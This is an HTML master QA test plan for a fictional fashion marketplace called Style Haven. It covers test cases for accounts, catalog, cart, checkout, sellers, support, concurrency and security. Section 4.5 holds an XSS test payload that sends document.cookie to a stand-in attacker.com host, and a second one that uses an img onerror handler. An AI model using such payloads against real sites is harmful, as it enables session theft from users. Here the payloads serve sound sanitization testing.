@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Style Haven - Master Test Plan</title>
+<style>
+  @page {
+    size: A4 landscape;
+    margin: 14mm 12mm 14mm 12mm;
+    @bottom-right {
+      content: counter(page);
+    }
+  }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: #1e293b;
+    line-height: 1.5;
+    font-size: 11px;
+    background-color: #ffffff;
+    margin: 0;
+    padding: 0;
+  }
+  h1 {
+    color: #0f172a;
+    font-size: 22px;
+    border-bottom: 3px solid #2563eb;
+    padding-bottom: 6px;
+    margin-top: 0;
+    margin-bottom: 12px;
+  }
+  h2 {
+    color: #1e3a8a;
+    font-size: 15px;
+    border-bottom: 1px solid #cbd5e1;
+    padding-bottom: 4px;
+    margin-top: 20px;
+    margin-bottom: 10px;
+    page-break-after: avoid;
+  }
+  h3 {
+    color: #1d4ed8;
+    font-size: 13px;
+    margin-top: 14px;
+    margin-bottom: 6px;
+    page-break-after: avoid;
+  }
+  h4 {
+    font-size: 12px;
+    color: #334155;
+    margin-top: 10px;
+    margin-bottom: 4px;
+  }
+  p, li {
+    font-size: 11px;
+    color: #334155;
+    margin: 4px 0;
+  }
+  hr {
+    border: none;
+    border-top: 1px solid #e2e8f0;
+    margin: 15px 0;
+  }
+  pre {
+    background-color: #0f172a;
+    color: #f8fafc;
+    padding: 10px;
+    border-radius: 6px;
+    font-size: 9.5px;
+    overflow-x: auto;
+    page-break-inside: avoid;
+  }
+  code {
+    background-color: #f1f5f9;
+    color: #0f172a;
+    padding: 1px 4px;
+    border-radius: 4px;
+    font-size: 10px;
+    font-family: Menlo, Monaco, Consolas, monospace;
+  }
+  pre code {
+    background: transparent;
+    color: inherit;
+    padding: 0;
+  }
+  .table-container {
+    margin: 10px 0 16px 0;
+    width: 100%;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 9px;
+    page-break-inside: auto;
+  }
+  tr {
+    page-break-inside: avoid;
+    page-break-after: auto;
+  }
+  thead {
+    display: table-header-group;
+  }
+  th {
+    background-color: #1e293b;
+    color: #ffffff;
+    font-weight: 600;
+    text-align: left;
+    padding: 6px 5px;
+    border: 1px solid #334155;
+  }
+  td {
+    padding: 5px;
+    border: 1px solid #cbd5e1;
+    vertical-align: top;
+    background-color: #ffffff;
+  }
+  tbody tr:nth-child(even) td {
+    background-color: #f8fafc;
+  }
+  strong {
+    color: #0f172a;
+  }
+</style>
+</head>
+<body>
+<h1>Comprehensive Master Test Plan & QA Test Suite</h1>
+<p><strong>Platform:</strong> "Style Haven" – Fashion E-commerce Marketplace</p>
+<p><strong>Document Version:</strong> 1.0.0-PROD</p>
+<p><strong>Author:</strong> Principal QA Test Architect</p>
+<p><strong>Scope:</strong> ALL MODULES (User Accounts, Product Catalog, Shopping Cart, Checkout, Seller Dashboard, Customer Support, Non-Functional, Security)</p>
+<hr/>
+<h2>1. Executive Summary & Strategy</h2>
+<p>Style Haven connects independent fashion designers with fashion-conscious shoppers aged 18–35. This test suite provides rigorous verification across all architectural tiers:</p>
+<li><strong>Client Tier:</strong> Web and Mobile Responsive UI, cross-browser consistency, accessibility (WCAG 2.1 AA).</li>
+<li><strong>Service & API Tier:</strong> RESTful & GraphQL endpoints, authentication tokens (JWT/OAuth), authorization matrices (RBAC/IDOR), idempotency, webhooks.</li>
+<li><strong>Data & Concurrency Tier:</strong> Distributed inventory locking (Redis/DB row locking), ACID compliance for checkouts, race condition mitigation.</li>
+<li><strong>Asynchronous Tier:</strong> Email dispatch queues, WebSocket chat sessions, payment gateway callbacks.</li>
+<h3>QA Resource Assignment Matrix</h3>
+<li><strong>QA Eng 1:</strong> Authentication, User Accounts, Profile, Wishlist, Loyalty, Customer Support (Live Chat/FAQ).</li>
+<li><strong>QA Eng 2:</strong> Product Catalog, Search & Filtering, Recommendations, Shopping Cart, Inventory Management, Seller Dashboard.</li>
+<li><strong>QA Eng 3:</strong> Checkout, Payment Gateways (Stripe/PayPal/Wallets), Order Fulfillment, Security, Concurrency, Performance (k6).</li>
+<hr/>
+<h2>2. High-Level Test Scenarios (Matrix Overview)</h2>
+<div class="table-container"><table>
+<thead><tr><th>Module</th><th>Positive Scenarios</th><th>Negative Scenarios</th><th>Boundary & Edge Cases</th></tr></thead><tbody>
+<tr><td><strong>1. User Accounts</strong></td><td>Email/password sign-up, Google/Apple OAuth login, 2FA prompt, profile update, order history view.</td><td>Weak password rejection, duplicate email registration, expired JWT token, brute force lockouts.</td><td>Max length names/emails, international phone formats, right-to-left (RTL) unicode characters, deleted account login attempt.</td></tr>
+<tr><td><strong>2. Product Catalog</strong></td><td>Category hierarchy browsing, faceted search (brand, price, size, color), recommendation carousel.</td><td>Fuzzy search typos with zero results fallback, corrupted image handling, invalid query parameter injection.</td><td>SQL/NoSQL injection via search params, 10,000+ pagination offset, simultaneous variant switching (Size/Color) with out-of-stock permutations.</td></tr>
+<tr><td><strong>3. Shopping Cart</strong></td><td>Add single/multiple items, quantity increment/decrement, session persistence across tabs, price recalculation.</td><td>Adding quantity greater than available stock, adding inactive/delisted products.</td><td>Concurrent cart mutation across devices, price updates mid-session, coupon application reducing subtotal to zero or negative.</td></tr>
+<tr><td><strong>4. Checkout & Payments</strong></td><td>Standard address validation, tiered shipping selection, successful credit card & digital wallet charge, order confirmation email.</td><td>Card declined (insufficient funds, CVV mismatch, expired card), webhook network failure.</td><td>Payment gateway timeout during 3D Secure verification, double-clicking "Pay Now" button, race condition on 1 remaining stock item across 2 simultaneous buyers.</td></tr>
+<tr><td><strong>5. Seller Dashboard</strong></td><td>Product listing creation with image upload, real-time inventory increment, order status update (Packed -> Shipped), label generation.</td><td>Uploading unsupported file types (>20MB executable), editing orders belonging to other sellers.</td><td>IDOR vulnerability on seller inventory modification, bulk CSV import with 5,000 items, low-stock threshold triggers at exact zero.</td></tr>
+<tr><td><strong>6. Customer Support</strong></td><td>Real-time agent chat initiation, FAQ keyword search, contact form submission with validation.</td><td>Submitting empty contact tickets, attachment containing malware payload.</td><td>WebSocket reconnect on cellular drop/reconnect, message flood rate-limiting (DDoS prevention), simultaneous multi-tab chat sync.</td></tr>
+</tbody></table></div>
+<hr/>
+<h2>3. Detailed Step-by-Step Test Cases</h2>
+<h3>Module 1: User Accounts & Authentication</h3>
+<div class="table-container"><table>
+<thead><tr><th>Test Case ID</th><th>Req Ref</th><th>Test Scenario & Objective</th><th>Pre-conditions & Test Data</th><th>Test Steps (Given / When / Then)</th><th>Expected Result</th><th>Severity / Priority</th><th>Assigned Engineer</th></tr></thead><tbody>
+<tr><td><strong>TC-ACC-001</strong></td><td>Req 1.1</td><td>Verify standard user registration with valid credentials</td><td>Clean browser session, non-existent email: <code>shopper.valid@stylehaven.io</code></td><td><strong>Given</strong> the user is on the registration page<br/><strong>When</strong> user inputs valid first name, last name, email, and compliant password (12+ chars, symbol, number)<br/><strong>And</strong> clicks "Create Account"<br/><strong>Then</strong> a verification email is dispatched</td><td>User account is created with <code>status: pending_verification</code>; JWT authentication token is issued; directed to verification prompt.</td><td>P1 / Blocker</td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-ACC-002</strong></td><td>Req 1.1</td><td>Verify social OAuth login (Google & Apple)</td><td>Google OAuth account configured with valid scopes</td><td><strong>Given</strong> user is on the login modal<br/><strong>When</strong> user clicks "Continue with Google" and authorizes consent screen<br/><strong>Then</strong> session is authenticated</td><td>System links Google email, auto-creates customer profile if first-time user, and redirects to intended destination without session desync.</td><td>P1 / Blocker</td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-ACC-003</strong></td><td>Req 1.1</td><td>Validate account lockout on repeated failed login attempts (Brute Force Defense)</td><td>Registered account <code>shopper.test@stylehaven.io</code></td><td><strong>Given</strong> user attempts login with incorrect password<br/><strong>When</strong> 5 consecutive failed attempts are executed within a 2-minute window<br/><strong>Then</strong> the 6th attempt is blocked with HTTP 429 / Lockout UI</td><td>Account is temporarily locked for 15 minutes; security notification email sent to user; generic error prevents email enumeration.</td><td>P2 / Critical</td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-ACC-004</strong></td><td>Req 1.2</td><td>Profile management - Update default shipping address & payment details</td><td>Authenticated user session</td><td><strong>Given</strong> user is in <code>Account Settings -> Address Book</code><br/><strong>When</strong> user adds a new address with special characters (<code>Apt #4-B, St. John's Way</code>) and marks as default<br/><strong>Then</strong> updates are saved to profile</td><td>Profile reflects new default address; subsequent checkout loads this address automatically; inputs are sanitized against XSS.</td><td>P2 / High</td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-ACC-005</strong></td><td>Req 1.3</td><td>Order History pagination and real-time status tracking</td><td>User with 25+ completed orders across various states (Delivered, In Transit, Processing)</td><td><strong>Given</strong> user navigates to "My Orders"<br/><strong>When</strong> user views orders and selects page 2, then clicks "Track Package" on an active order<br/><strong>Then</strong> courier tracking modal opens</td><td>Orders display accurate dates, SKU thumbnails, itemized costs, and tracking stepper aligns with third-party logistics (3PL) API payload.</td><td>P3 / Medium</td><td>QA Eng 1</td></tr>
+</tbody></table></div>
+<hr/>
+<h3>Module 2: Product Catalog, Search & Recommendations</h3>
+<div class="table-container"><table>
+<thead><tr><th>Test Case ID</th><th>Req Ref</th><th>Test Scenario & Objective</th><th>Pre-conditions & Test Data</th><th>Test Steps (Given / When / Then)</th><th>Expected Result</th><th>Severity / Priority</th><th>Assigned Engineer</th></tr></thead><tbody>
+<tr><td><strong>TC-CAT-001</strong></td><td>Req 2.1</td><td>Faceted product search by multiple filters (Category, Size, Price Range, Designer Brand)</td><td>Catalog contains 1,000+ populated products</td><td><strong>Given</strong> user is on the Women's Apparel listing page<br/><strong>When</strong> user filters by Size "M", Price "$50-$150", and Brand "Atelier Noir"<br/><strong>Then</strong> filter parameters update in URL and UI updates reactively</td><td>Only items matching all active filter criteria are rendered; total product count accurately matches database query results.</td><td>P2 / High</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CAT-002</strong></td><td>Req 2.1</td><td>Search engine query with typos, special characters, and zero results fallback</td><td>Search keyword: <code>vntage jackett!@#</code></td><td><strong>Given</strong> user enters keyword into global search bar<br/><strong>When</strong> user presses Enter<br/><strong>Then</strong> Elasticsearch/Algolia performs fuzzy matching</td><td>Search engine suggests "Did you mean: Vintage Jacket?" with relevant matches; zero-result state renders curated "Trending Now" recommendations.</td><td>P3 / Medium</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CAT-003</strong></td><td>Req 2.2</td><td>Product Detail Page (PDP) variant switching (Size x Color matrix) and inventory reflection</td><td>Product SKU with 3 colors (Black, Cream, Olive) and 4 sizes (S, M, L, XL) where Cream-M is out of stock</td><td><strong>Given</strong> user is on PDP for "Linen Oversized Blazer"<br/><strong>When</strong> user clicks "Cream" color swatch, then clicks "M" size button<br/><strong>Then</strong> UI updates price, image gallery, and stock indicator</td><td>"Add to Cart" button changes to disabled "Out of Stock / Notify Me"; gallery shows high-res photos for selected color variant only.</td><td>P1 / Blocker</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CAT-004</strong></td><td>Req 2.2</td><td>Interactive size chart modal and responsive image zoom</td><td>Desktop and Mobile viewport</td><td><strong>Given</strong> user is on PDP<br/><strong>When</strong> user hovers over main hero image on desktop or pinches on mobile<br/><strong>And</strong> clicks "Size Guide"<br/><strong>Then</strong> size chart drawer opens</td><td>Image zoom magnifies texture without pixelation; size guide provides metric and imperial conversion tables without layout breakage.</td><td>P3 / Medium</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CAT-005</strong></td><td>Req 2.3</td><td>Personalized recommendation algorithm validation</td><td>User browsing history contains 5 Bohemian dresses</td><td><strong>Given</strong> authenticated user navigates to Home or PDP<br/><strong>When</strong> recommendation carousel "Recommended For You" loads<br/><strong>Then</strong> items are populated via recommendation engine</td><td>Rec engine displays items matching user style preferences, tags, and designer affinity; cold-start users receive top-selling items.</td><td>P3 / Medium</td><td>QA Eng 2</td></tr>
+</tbody></table></div>
+<hr/>
+<h3>Module 3: Shopping Cart Management</h3>
+<div class="table-container"><table>
+<thead><tr><th>Test Case ID</th><th>Req Ref</th><th>Test Scenario & Objective</th><th>Pre-conditions & Test Data</th><th>Test Steps (Given / When / Then)</th><th>Expected Result</th><th>Severity / Priority</th><th>Assigned Engineer</th></tr></thead><tbody>
+<tr><td><strong>TC-CRT-001</strong></td><td>Req 3.1</td><td>Add item to cart from PDP with variant parameters</td><td>Product with SKU <code>DRS-SILK-01</code>, Size: S, Color: Emerald</td><td><strong>Given</strong> user selects Size S and Color Emerald<br/><strong>When</strong> user clicks "Add to Cart"<br/><strong>Then</strong> mini-cart flyout opens</td><td>Item is added with correct SKU, price, variant attributes; cart badge counter increments by 1; subtotal updates accurately.</td><td>P1 / Blocker</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CRT-002</strong></td><td>Req 3.1</td><td>Guest cart migration upon user login</td><td>Guest user has 2 items in local storage/cookie cart</td><td><strong>Given</strong> guest user adds items to cart<br/><strong>When</strong> user clicks "Log In" and authenticates successfully<br/><strong>Then</strong> cart state is evaluated</td><td>Guest cart items merge with any existing persistent server-side cart for that account; duplicates consolidate quantities up to max inventory.</td><td>P2 / Critical</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CRT-003</strong></td><td>Req 3.2</td><td>Cart quantity adjustment exceeding stock limit</td><td>Item has exactly 3 units left in warehouse</td><td><strong>Given</strong> user has 2 units in cart<br/><strong>When</strong> user clicks <code>+</code> to change quantity to 4<br/><strong>Then</strong> API returns stock availability error</td><td>Quantity clamps to 3; user receives warning banner: "Only 3 items available in stock"; subtotal adjusts to 3 units.</td><td>P2 / High</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CRT-004</strong></td><td>Req 3.3</td><td>Promo code application with subtotal calculation, tax, and free shipping threshold</td><td>Cart value: $95. Free shipping threshold: $100. Promo: <code>SUMMER15</code> (15% off)</td><td><strong>Given</strong> user enters coupon code <code>SUMMER15</code><br/><strong>When</strong> user clicks "Apply"<br/><strong>Then</strong> discount of $14.25 is deducted</td><td>New subtotal = $80.75; shipping fee ($10) is added because discounted subtotal is below $100 threshold; taxes calculated on discounted amount.</td><td>P2 / High</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-CRT-005</strong></td><td>Req 3.3</td><td>Dynamic price update notification while item resides in cart</td><td>Designer changes item price from $120 to $100 while user has it in cart</td><td><strong>Given</strong> user left item in cart overnight<br/><strong>When</strong> user re-opens cart page<br/><strong>Then</strong> cart syncs with latest catalog price</td><td>Cart recalculates with $100; subtle alert displays: "Price for [Item] changed from $120 to $100"; prevents purchasing at stale price.</td><td>P2 / High</td><td>QA Eng 2</td></tr>
+</tbody></table></div>
+<hr/>
+<h3>Module 4: Checkout, Payments & Order Processing</h3>
+<div class="table-container"><table>
+<thead><tr><th>Test Case ID</th><th>Req Ref</th><th>Test Scenario & Objective</th><th>Pre-conditions & Test Data</th><th>Test Steps (Given / When / Then)</th><th>Expected Result</th><th>Severity / Priority</th><th>Assigned Engineer</th></tr></thead><tbody>
+<tr><td><strong>TC-CHK-001</strong></td><td>Req 4.1</td><td>Shipping address validation and carrier rate selection</td><td>Valid destination address</td><td><strong>Given</strong> user enters shipping address in checkout step 1<br/><strong>When</strong> user selects "Express 2-Day Air" ($18.00)<br/><strong>Then</strong> order review summary updates</td><td>Total order price immediately reflects shipping surcharge; delivery estimate date displays dynamically based on business days.</td><td>P1 / Blocker</td><td>QA Eng 3</td></tr>
+<tr><td><strong>TC-CHK-002</strong></td><td>Req 4.2</td><td>Successful end-to-end payment with 3D-Secure Credit Card</td><td>Valid Test Visa with 3DS challenge trigger</td><td><strong>Given</strong> user is on Payment step<br/><strong>When</strong> user inputs CC details and clicks "Place Order"<br/><strong>And</strong> completes OTP on 3DS simulator iframe<br/><strong>Then</strong> payment gateway captures charge</td><td>Charge succeeds; idempotency key prevents duplicate transaction; webhook confirms payment; user redirected to <code>/order-success/{orderId}</code>.</td><td>P1 / Blocker</td><td>QA Eng 3</td></tr>
+<tr><td><strong>TC-CHK-003</strong></td><td>Req 4.2</td><td>Payment failure handling (Insufficient funds / Card expired)</td><td>Test card with declined response code (<code>insufficient_funds</code>)</td><td><strong>Given</strong> user submits checkout with declining payment method<br/><strong>When</strong> payment API returns rejection<br/><strong>Then</strong> checkout state remains intact</td><td>Clear, non-technical error: "Card was declined. Please try another payment method"; user stays on checkout page with cart contents preserved.</td><td>P1 / Blocker</td><td>QA Eng 3</td></tr>
+<tr><td><strong>TC-CHK-004</strong></td><td>Req 4.2</td><td>Digital wallet transaction (Apple Pay / Google Pay)</td><td>Browser with active Apple Pay / Google Pay session</td><td><strong>Given</strong> user selects "Apple Pay" on checkout<br/><strong>When</strong> biometric authentication (FaceID/TouchID) completes sheet authorization<br/><strong>Then</strong> billing & shipping address sync from wallet</td><td>Order creates seamlessly without redundant manual form filling; authorization token validates on backend.</td><td>P2 / Critical</td><td>QA Eng 3</td></tr>
+<tr><td><strong>TC-CHK-005</strong></td><td>Req 4.3</td><td>Order confirmation trigger & asynchronous email receipt delivery</td><td>Successful payment completion</td><td><strong>Given</strong> order is placed successfully<br/><strong>When</strong> message queue (<code>RabbitMQ</code>/<code>Kafka</code>/<code>PubSub</code>) receives <code>order.created</code> event<br/><strong>Then</strong> notification service dispatches email</td><td>Confirmation email arrives within 60s containing order ID, itemized breakdown, tax invoice, shipping ETA, and cancellation link.</td><td>P2 / High</td><td>QA Eng 3</td></tr>
+</tbody></table></div>
+<hr/>
+<h3>Module 5: Seller Dashboard & Order Fulfillment</h3>
+<div class="table-container"><table>
+<thead><tr><th>Test Case ID</th><th>Req Ref</th><th>Test Scenario & Objective</th><th>Pre-conditions & Test Data</th><th>Test Steps (Given / When / Then)</th><th>Expected Result</th><th>Severity / Priority</th><th>Assigned Engineer</th></tr></thead><tbody>
+<tr><td><strong>TC-SEL-001</strong></td><td>Req 5.1</td><td>New product listing creation with media assets & variant pricing</td><td>Authenticated seller account</td><td><strong>Given</strong> seller is on <code>/dashboard/products/new</code><br/><strong>When</strong> seller fills title, markdown description, tags, variant SKUs, and uploads 4 WebP images<br/><strong>And</strong> clicks "Publish"<br/><strong>Then</strong> listing becomes active</td><td>Product appears in public catalog within 30s cache invalidation; image CDN processes thumbnails; inventory records initialize in DB.</td><td>P1 / Blocker</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-SEL-002</strong></td><td>Req 5.2</td><td>Low stock automated alert notification threshold</td><td>Item inventory reaches configured threshold (e.g., <= 2 units)</td><td><strong>Given</strong> a product has 3 units in stock<br/><strong>When</strong> customer purchases 1 unit<br/><strong>Then</strong> remaining count drops to 2</td><td>Dashboard badge displays "Low Stock Alert"; automated notification email sent to seller; PDP displays "Only 2 left in stock!".</td><td>P2 / High</td><td>QA Eng 2</td></tr>
+<tr><td><strong>TC-SEL-003</strong></td><td>Req 5.3</td><td>Order fulfillment lifecycle & shipping label PDF generation</td><td>Order in <code>PAID / UNFULFILLED</code> state assigned to seller</td><td><strong>Given</strong> seller opens order details<br/><strong>When</strong> seller inputs parcel dimensions/weight and clicks "Generate Shipping Label"<br/><strong>Then</strong> tracking number is assigned via carrier API</td><td>Printable PDF shipping label opens in browser; order status transitions to <code>PROCESSING / SHIPPED</code>; customer tracking link activates.</td><td>P1 / Blocker</td><td>QA Eng 3</td></tr>
+<tr><td><strong>TC-SEL-004</strong></td><td>Req 5.3</td><td>Prevent seller from viewing or modifying orders belonging to another designer (RBAC)</td><td>Seller A (<code>ID: 101</code>) and Seller B (<code>ID: 102</code>)</td><td><strong>Given</strong> Seller A is authenticated<br/><strong>When</strong> Seller A crafts request to <code>/api/seller/orders/999</code> (an order exclusively containing Seller B items)<br/><strong>Then</strong> API denies request</td><td>API responds with HTTP 403 Forbidden or 404 Not Found; zero unauthorized order or customer data leaked.</td><td>P1 / Blocker</td><td>QA Eng 3</td></tr>
+</tbody></table></div>
+<hr/>
+<h3>Module 6: Customer Support & Additional Features</h3>
+<div class="table-container"><table>
+<thead><tr><th>Test Case ID</th><th>Req Ref</th><th>Test Scenario & Objective</th><th>Pre-conditions & Test Data</th><th>Test Steps (Given / When / Then)</th><th>Expected Result</th><th>Severity / Priority</th><th>Assigned Engineer</th></tr></thead><tbody>
+<tr><td><strong>TC-SUP-001</strong></td><td>Req 6.1</td><td>Real-time Live Chat session initialization and message exchange</td><td>Customer on store front, support agent logged in dashboard</td><td><strong>Given</strong> customer opens chat widget<br/><strong>When</strong> customer sends "I have a question about sizing"<br/><strong>Then</strong> WebSocket establishes connection</td><td>Agent receives incoming ticket; bidirectional chat transmits in <500ms; typing indicator and read receipts render correctly.</td><td>P2 / High</td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-SUP-002</strong></td><td>Req 6.2</td><td>FAQ accordion interaction and keyword search indexing</td><td>FAQ contains 20+ questions across Categories (Returns, Shipping, Payments)</td><td><strong>Given</strong> user navigates to <code>/faq</code><br/><strong>When</strong> user types "refund timeline" into search filter<br/><strong>Then</strong> accordion expands relevant answers</td><td>Live filtering isolates relevant entries; clicking accordion toggles smooth CSS open/close animation with proper ARIA attributes.</td><td>P3 / Medium</td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-OPT-001</strong></td><td>Req 7.1</td><td>Wishlist toggle, persistence, and move-to-cart action</td><td>Authenticated user</td><td><strong>Given</strong> user clicks Heart icon on PDP<br/><strong>When</strong> item is added to Wishlist, and user later clicks "Move to Cart"<br/><strong>Then</strong> item shifts to active cart</td><td>Heart icon toggles filled state; item removed from Wishlist and added to Cart with selected size/color preserved.</td><td>P3 / Medium</td><td>QA Eng 1</td></tr>
+<tr><td><strong>TC-OPT-002</strong></td><td>Req 7.3</td><td>Loyalty points calculation on order placement and checkout redemption</td><td>User has 500 Loyalty points ($5 value)</td><td><strong>Given</strong> user reaches checkout payment step<br/><strong>When</strong> user selects "Apply 500 Points for $5 discount"<br/><strong>Then</strong> order balance deducts $5.00</td><td>Points balance updates to 0 pending order confirmation; upon order delivery, newly earned points credit to account.</td><td>P3 / Medium</td><td>QA Eng 1</td></tr>
+</tbody></table></div>
+<hr/>
+<h2>4. Non-Functional & Security Edge Scenarios</h2>
+<h3>4.1 Race Condition & Inventory Over-Allocation (Double Spend)</h3>
+<li><strong>Scenario:</strong> High-demand flash sale item has exactly <strong>1 unit</strong> remaining in stock. Two customers (User A and User B) simultaneously click "Place Order & Pay" at the exact same millisecond (<code>T0</code>).</li>
+<li><strong>Test Design:</strong></li>
+<li>Execute concurrent JMeter / k6 virtual users sending identical <code>POST /api/v1/orders/checkout</code> payloads using Redis distributed locking (<code>SET key value NX PX 5000</code>) or database row locking (<code>SELECT ... FOR UPDATE</code>).</li>
+<li><strong>Expected Result:</strong> Exactly <strong>one</strong> order succeeds (HTTP 200/201). The second request fails with HTTP 409 Conflict ("Item was purchased by another shopper"). Warehouse inventory never drops to <code>-1</code>.</li>
+<h3>4.2 Payment Gateway Webhook Loss & Network Recovery</h3>
+<li><strong>Scenario:</strong> Customer completes 3D-Secure authentication on Stripe/PayPal modal, but closes browser tab before redirect back to Style Haven, OR network timeout drops the immediate HTTP response.</li>
+<li><strong>Test Design:</strong></li>
+<li>Simulate client disconnection immediately upon card capture.</li>
+<li>Verify that background webhook listener (<code>POST /api/v1/webhooks/stripe</code>) receives <code>payment_intent.succeeded</code>.</li>
+<li><strong>Expected Result:</strong> Backend idempotently fulfills order, assigns order status <code>PAID</code>, reserves inventory, and dispatches confirmation email without requiring the user's browser redirect.</li>
+<h3>4.3 Insecure Direct Object Reference (IDOR) & Privilege Escalation</h3>
+<li><strong>Scenario:</strong> Authenticated standard customer attempts to access <code>/api/v1/orders/{foreign_order_id}</code> or seller endpoints <code>/api/v1/seller/{seller_id}/payouts</code>.</li>
+<li><strong>Test Design:</strong></li>
+<li>Automated OWASP ZAP & Postman test suite executing cross-account ID parameter fuzzing.</li>
+<li><strong>Expected Result:</strong> API returns HTTP 403 Forbidden or 404 Not Found. Zero PII (Personally Identifiable Information) or financial records exposed.</li>
+<h3>4.4 WebSocket Reconnection & State Recovery (Live Chat)</h3>
+<li><strong>Scenario:</strong> Customer engaged in active Live Chat support loses internet connection (e.g., switches Wi-Fi to cellular or enters tunnel) for 15 seconds.</li>
+<li><strong>Test Design:</strong></li>
+<li>Simulate <code>navigator.onLine = false</code> during WebSocket session, queue 2 outbound messages, then trigger <code>online</code>.</li>
+<li><strong>Expected Result:</strong> Client automatically initiates exponential backoff reconnection, re-authenticates socket with token, replays unsent messages from IndexedDB/memory queue, and reconciles missed incoming messages without conversation loss.</li>
+<h3>4.5 Cross-Site Scripting (XSS) in Product Reviews & Seller Notes</h3>
+<li><strong>Scenario:</strong> Malicious actor injects <code><script>fetch('http://attacker.com/steal?c='+document.cookie)</script></code> or <code><img src=x onerror=alert(1)></code> into Product Review text or Seller Shipping Notes.</li>
+<li><strong>Test Design:</strong></li>
+<li>Submit dirty payloads through review submission forms and seller portals.</li>
+<li><strong>Expected Result:</strong> Content is strictly escaped/sanitized on server ingestion and rendered safely as text, preventing arbitrary JavaScript execution in victim browsers.</li>
+<hr/>
+<h2>5. Automated Test Feasibility & Framework Recommendations</h2>
+<pre><code>                               +--------------------------------------------+
+                               |     Style Haven Automation Pyramid         |
+                               +--------------------------------------------+
+                                              /              \
+                                             /   E2E Tests    \     Playwright
+                                            /   (15% - P1s)    \
+                                           +--------------------+
+                                          /   Integration / API  \  Playwright API /
+                                         /       (35%)            \ Supertest
+                                        +--------------------------+
+                                       /         Unit Tests         \ Vitest / Jest
+                                      /            (50%)             \
+                                     +--------------------------------+
+                                    [ k6: Load / Stress / Concurrency Tests ]</code></pre>
+<h3>5.1 Playwright (End-to-End Critical User Journeys)</h3>
+<p>Playwright is recommended for multi-browser, resilient, parallel E2E testing due to native auto-waiting, network mocking, and headless speed:</p>
+<li><strong>Candidate Journey 1:</strong> <em>Guest-to-Paid Customer Flow</em> (Search -> Filter -> PDP Variant Selection -> Add to Cart -> Guest Checkout -> Card Payment -> Confirmation Screen).</li>
+<li><strong>Candidate Journey 2:</strong> <em>Seller Product Lifecycle</em> (Seller Login -> Create Product Listing -> Validate catalog visibility -> Adjust Stock).</li>
+<li><strong>Candidate Journey 3:</strong> <em>Cart State Synchronization</em> (Mutating cart on Mobile viewport, logging in on Desktop, asserting state consistency).</li>
+<h3>5.2 Cypress (Frontend Component & Fast Local Dev Feedback)</h3>
+<li><strong>Candidate Journey 1:</strong> PDP interactive components (Size guide drawer, high-res zoom carousel, interactive swatch toggling).</li>
+<li><strong>Candidate Journey 2:</strong> Client-side Form Validation & Error States (Checkout form empty fields, credit card Luhn check validation, zip code formatting).</li>
+<h3>5.3 k6 (Performance, Concurrency & Load Testing)</h3>
+<li><strong>Candidate Test 1 (Flash Sale Concurrency):</strong> 500 concurrent virtual users hitting <code>POST /api/v1/cart/add</code> and <code>POST /api/v1/checkout</code> on 5 limited-edition inventory SKUs to validate locking mechanisms.</li>
+<li><strong>Candidate Test 2 (Peak Traffic Stress Test):</strong> Simulating 5,000 requests/sec across catalog browse and elasticsearch queries with SLA threshold: <code>p95 < 350ms</code>, <code>error_rate < 0.01%</code>.</li>
+<li><strong>Candidate Test 3 (Sustained Soak Test):</strong> 4-hour endurance test at 500 RPS to discover memory leaks in backend microservices and database connection pool exhaustion.</li>
+<hr/>
+<h2>6. Test Environment & Entry/Exit Criteria</h2>
+<h3>Entry Criteria for Staging QA</h3>
+<p>1. All user stories deployed to Staging with green Unit & Integration test pipelines (>85% code coverage).</p>
+<p>2. Sanitized seed database populated with minimum 5,000 SKUs, 20 seller accounts, and mock tax/shipping tables.</p>
+<p>3. Third-party sandboxes configured and reachable (Stripe Sandbox, SendGrid Sandbox, Shippo/EasyPost Mock).</p>
+<h3>Exit Criteria for Production Release</h3>
+<p>1. <strong>Zero Blocker (P1) or Critical (P2)</strong> open defects.</p>
+<p>2. All High-Level Test Scenarios (Positive & Negative) successfully executed with artifacts attached.</p>
+<p>3. Automated regression suite achieves <strong>100% pass rate</strong> on production-build release candidate.</p>
+<p>4. Security sign-off: OWASP Top 10 vulnerabilities verified with zero High/Critical CVEs.</p>
+<p>5. Sign-off received from Principal QA Test Architect and Product Owner.</p>
+</body>
+</html>
